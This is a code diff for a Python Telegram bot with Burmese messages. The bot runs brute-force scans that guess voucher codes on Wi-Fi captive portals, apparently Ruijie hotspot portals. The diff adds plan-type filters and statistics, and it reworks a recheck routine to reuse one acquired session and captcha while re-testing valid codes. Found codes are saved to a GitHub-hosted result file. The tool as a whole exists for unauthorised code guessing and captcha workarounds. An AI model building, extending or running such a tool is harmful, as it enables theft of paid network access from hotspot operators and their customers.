-        "၅။ /resume  – ဆက်ရှာဖွေခြင်း\n"
-        "၆။ /saved   – ရလဒ်ကြည့်ခြင်း\n"
-        "၇။ /delete_saved – ရလဒ်ဖျက်ခြင်း\n"
-        "၈။ /recheck – Success codes ပြန်စစ်ခြင်း\n"
-        "၉။ /notify  – Notification ON/OFF"
+        "     5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n\n"
+        "၃။ /stop    – ရပ်တန့်ခြင်း\n"
+        "၄။ /resume  – ဆက်ရှာဖွေခြင်း\n"
+        "၅။ /saved   – ရလဒ်ကြည့်ခြင်း\n"
+        "၆။ /delete_saved – ရလဒ်ဖျက်ခြင်း\n"
+        "၇။ /recheck – Success codes ပြန်စစ်ခြင်း\n"
+        "၈။ /notify  – Notification ON/OFF\n"
+        "၉။ /filter  – Plan filter သတ်မှတ်ခြင်း\n"
+        "၁၀။ /stats  – စာရင်းအင်းကြည့်ခြင်း"
     )
     await bot.reply_to(message, help_text, parse_mode="Markdown")
+
 
 @bot.message_handler(commands=['setup'])
 async def handle_setup(message):
     args = message.text.split(maxsplit=1)
     if len(args) < 2:
-        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url\n\nဥပမာ:\nhttps://portal-mm-as.ruijienetworks.com/...")
+        await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url")
         return
     url = args[1]
     await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
     if await check_session_url(url):
         cid = message.chat.id
-        portal_config, portal_name = get_portal_config(url)
+        _, portal_name = get_portal_config(url)
         user_data[cid] = {'session_url': url, 'portal_type': portal_name}
         success_texts.pop(cid, None)
         limited_texts.pop(cid, None)
@@ -783,16 +965,34 @@ async def handle_setup(message):
         pending_brute.pop(cid, None)
         success_messages.pop(cid, None)
         limited_messages.pop(cid, None)
+        # Clear captcha cache for this chat
+        for key in list(captcha_state.keys()):
+            if key.startswith(f"{cid}_"):
+                _cache_clear(key)
         try:
             results, sha = await get_file_content("result.json")
             if str(cid) in results:
                 del results[str(cid)]
                 await update_file_content("result.json", results, sha, f"Clear codes for {cid}")
         except Exception as e:
-            print(f"[setup] GitHub clear error: {e}")
-        await bot.reply_to(message, f"✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n🌐 Portal: {portal_name}\n/brute ဖြင့် စတင်ပါ။")
+            logger.error(f"[setup] GitHub clear error: {e}")
+        await bot.reply_to(message, f"✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n🌐 Portal: {portal_name}")
     else:
         await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")
+
+
+@bot.message_handler(commands=['filter'])
+async def set_filter(message):
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2:
+        await bot.reply_to(message, "အသုံးပြုနည်း: /filter 1d,2h,unlimit")
+        return
+    filters = [f.strip() for f in args[1].split(',') if f.strip()]
+    chat_id = message.chat.id
+    pending_brute.setdefault(chat_id, {})["plan_filters"] = filters
+    last_scan_params.setdefault(chat_id, {})["plan_filters"] = filters
+    await bot.reply_to(message, f"✅ Plan filters set: {filters}")
+
 
 @bot.message_handler(commands=['brute'])
 async def brute(message):
@@ -835,18 +1035,24 @@ async def brute(message):
         await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
         return
 
-    if chat_id in last_scan_params:
+    plan_filters = pending_brute.get(chat_id, {}).get("plan_filters", [])
+
+    if chat_id in last_scan_params and last_scan_params[chat_id].get("mode") is not None:
         markup = InlineKeyboardMarkup()
         markup.add(InlineKeyboardButton("Resume", callback_data="resume_scan"),
                    InlineKeyboardButton("New Scan", callback_data="new_scan"))
-        pending_brute[chat_id] = {"mode": mode, "length": length, "target": target, "plan_filters": []}
+        pending_brute[chat_id] = {
+            "mode": mode, "length": length, "target": target, "plan_filters": plan_filters
+        }
         prev = last_scan_params[chat_id]
         await bot.reply_to(message,
-            f"ယခင် scan ရပ်ထားသည် (mode: {prev['mode']}, length: {prev.get('length', '?')}, target: {prev['target']}).\nပြန်စမလား၊ အသစ်စမလား?",
+            f"ယခင် scan ရပ်ထားသည် (mode: {prev['mode']}, length: {prev.get('length', '?')}).\n"
+            "ပြန်စမလား၊ အသစ်စမလား?",
             reply_markup=markup)
         return
 
-    await start_brute_scan(chat_id, mode, length, target, message)
+    await start_brute_scan(chat_id, mode, length, target, message, plan_filters=plan_filters)
+
 
 async def start_brute_scan(chat_id, mode, length, target, original_message, plan_filters=None):
     plan_filters = plan_filters or []
@@ -868,6 +1074,7 @@ async def start_brute_scan(chat_id, mode, length, target, original_message, plan
     success_messages.pop(chat_id, None)
     limited_messages.pop(chat_id, None)
 
+
 @bot.message_handler(commands=['stop'])
 async def stop_scan(message):
     chat_id = message.chat.id
@@ -876,9 +1083,10 @@ async def stop_scan(message):
         data["stop"] = True
         if not data["task"].done():
             data["task"].cancel()
-        await bot.reply_to(message, "Scan ရပ်ထားပါသည်။ ပြန်စလိုပါက /resume ကိုသုံးပါ။")
+        await bot.reply_to(message, "Scan ရပ်ထားပါသည်။ /resume ဖြင့် ပြန်စနိုင်ပါသည်။")
     else:
         await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")
+
 
 @bot.message_handler(commands=['resume'])
 async def resume_scan(message):
@@ -887,8 +1095,13 @@ async def resume_scan(message):
         await bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
         return
     params = last_scan_params.pop(chat_id)
-    await start_brute_scan(chat_id, params['mode'], params.get('length', 6), params['target'], message, plan_filters=params.get('plan_filters', []))
+    await start_brute_scan(
+        chat_id, params['mode'], params.get('length', 6),
+        params.get('target'), message,
+        plan_filters=params.get('plan_filters', [])
+    )
     await bot.reply_to(message, "ယခင် scan ပြန်စပါပြီ။")
+
 
 @bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
 async def handle_resume_callback(call):
@@ -900,15 +1113,24 @@ async def handle_resume_callback(call):
             return
         params = last_scan_params.pop(chat_id)
         await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
-        await start_brute_scan(chat_id, params['mode'], params.get('length', 6), params['target'], call.message, plan_filters=params.get('plan_filters', []))
+        await start_brute_scan(
+            chat_id, params['mode'], params.get('length', 6),
+            params.get('target'), call.message,
+            plan_filters=params.get('plan_filters', [])
+        )
     else:
         if chat_id in pending_brute:
             params = pending_brute.pop(chat_id)
             last_scan_params.pop(chat_id, None)
             await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
-            await start_brute_scan(chat_id, params['mode'], params.get('length', 6), params['target'], call.message, plan_filters=params.get('plan_filters', []))
+            await start_brute_scan(
+                chat_id, params['mode'], params.get('length', 6),
+                params.get('target'), call.message,
+                plan_filters=params.get('plan_filters', [])
+            )
         else:
             await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။", chat_id=chat_id, message_id=call.message.message_id)
+
 
 @bot.message_handler(commands=['saved'])
 async def saved_codes(message):
@@ -953,6 +1175,7 @@ async def saved_codes(message):
     else:
         await bot.reply_to(message, full_text, parse_mode="Markdown")
 
+
 @bot.message_handler(commands=['delete_saved'])
 async def delete_saved(message):
     chat_id = message.chat.id
@@ -967,9 +1190,10 @@ async def delete_saved(message):
             del results[str(chat_id)]
             await update_file_content("result.json", results, sha, f"Clear codes for {chat_id}")
     except Exception as e:
-        print(f"[delete_saved] Error: {e}")
+        logger.error(f"[delete_saved] Error: {e}")
 
     await bot.reply_to(message, "🗑️ Saved codes များအားလုံးဖျက်ပြီးပါပြီ။")
+
 
 @bot.message_handler(commands=['notify'])
 async def toggle_notify(message):
@@ -978,6 +1202,7 @@ async def toggle_notify(message):
     notify_setting[chat_id] = not current
     state = "ON" if notify_setting[chat_id] else "OFF"
     await bot.reply_to(message, f"Notify: {state}")
+
 
 @bot.message_handler(commands=['recheck'])
 async def recheck(message):
@@ -989,16 +1214,36 @@ async def recheck(message):
     if not success:
         await bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ။")
         return
+
     await bot.reply_to(message, "Success codes များကို ပြန်လည်စစ်ဆေးနေပါသည်...")
+
+    session_url = user_data[chat_id]['session_url']
+    portal_config, _ = get_portal_config(session_url)
+
+    acquired = await acquire_session_and_captcha(session_url, portal_config)
+    if not acquired:
+        await bot.reply_to(message, "❌ Session ရယူ၍ မရပါ။")
+        return
+
     new_success = []
-    for item in success:
-        code = item["code"]
-        recode = await perform_check(
-            user_data[chat_id]['session_url'], code, chat_id,
-            recheck=True, message=message
-        )
-        if recode:
-            new_success.append(item)
+    try:
+        for item in success:
+            res = await perform_check(
+                session_url, item["code"], chat_id,
+                recheck=True, message=message,
+                shared_session=acquired["session"],
+                shared_session_id=acquired["session_id"],
+                shared_auth_code=acquired["auth_code"],
+            )
+            if isinstance(res, dict) and res.get("status") == "success":
+                new_success.append(item)
+            await asyncio.sleep(0.1)  # Rate limit friendly
+    finally:
+        try:
+            await acquired["session"].close()
+        except:
+            pass
+
     if new_success:
         success_texts[chat_id] = new_success
         codes_str = "\n".join([i["code"] for i in new_success])
@@ -1006,6 +1251,21 @@ async def recheck(message):
     else:
         success_texts[chat_id] = []
         await bot.reply_to(message, "Recheck ပြီးပါပြီ၊ success code တစ်ခုမျှမကျန်ပါ။")
+
+
+@bot.message_handler(commands=['stats'])
+async def stats(message):
+    chat_id = message.chat.id
+    total_success = sum(len(v) for v in success_texts.values())
+    total_limited = sum(len(v) for v in limited_texts.values())
+    await bot.reply_to(message,
+        f"📊 Stats\n"
+        f"✅ Success (total): {total_success}\n"
+        f"⚠️ Limited (total): {total_limited}\n"
+        f"👤 Your success: {len(success_texts.get(chat_id, []))}\n"
+        f"👤 Your limited: {len(limited_texts.get(chat_id, []))}"
+    )
+
 
 @bot.message_handler(commands=['status'])
 async def status(message):
@@ -1024,8 +1284,10 @@ async def status(message):
         f"👥 Sessions Loaded: {len(user_data)}\n"
         f"⚡ Concurrency: {CONCURRENCY}\n"
         f"📦 Batch Size: {BATCH_SIZE}\n"
+        f"🔒 Captcha Cache: {len(captcha_state)}\n"
         f"🌐 Default Portal: {DEFAULT_PORTAL}"
     )
+
 
 @bot.message_handler(commands=['testbalance'])
 async def testbalance(message):
@@ -1071,6 +1333,7 @@ async def testbalance(message):
         )
         await bot.send_message(chat_id, result, parse_mode="Markdown")
 
+
 # ── Polling and main ──────────────────────────────────────────────────────
 async def start_polling():
     backoff = 5
@@ -1079,26 +1342,59 @@ async def start_polling():
             await bot.infinity_polling(timeout=20, request_timeout=20)
             return
         except (aiohttp.ClientError, asyncio.TimeoutError) as e:
-            print(f"Polling error: {e}. Reconnecting in {backoff}s...")
+            logger.warning(f"Polling error: {e}. Reconnecting in {backoff}s...")
             await asyncio.sleep(backoff)
             backoff = min(backoff * 2, 60)
         except Exception as e:
-            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
+            logger.error(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
             await asyncio.sleep(backoff)
             backoff = min(backoff * 2, 60)
+
 
 async def main():
     global session, _connector
     timeout = aiohttp.ClientTimeout(total=30)
-    _connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, ssl=False)
+    _connector = aiohttp.TCPConnector(limit=500, ttl_dns_cache=300, ssl=False)
     session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
+
+    stop_event = asyncio.Event()
+
+    def _shutdown():
+        logger.info("Shutdown signal received")
+        stop_event.set()
+
     try:
+        loop = asyncio.get_event_loop()
+        for sig in (signal.SIGINT, signal.SIGTERM):
+            try:
+                loop.add_signal_handler(sig, _shutdown)
+            except NotImplementedError:
+                pass  # Windows
+
         asyncio.create_task(web_server())
         asyncio.create_task(github_update_scheduler())
-        await start_polling()
+
+        polling_task = asyncio.create_task(start_polling())
+
+        await stop_event.wait()
+
+        polling_task.cancel()
+        for data in scan_tasks.values():
+            if not data["task"].done():
+                data["task"].cancel()
+
+        await asyncio.gather(
+            *[d["task"] for d in scan_tasks.values() if not d["task"].done()],
+            return_exceptions=True
+        )
     finally:
+        # Close all cached sessions
+        for key in list(captcha_state.keys()):
+            _cache_clear(key)
         await session.close()
         await _connector.close()
+        logger.info("Shutdown complete")
+
 
 if __name__ == '__main__':
     asyncio.run(main())
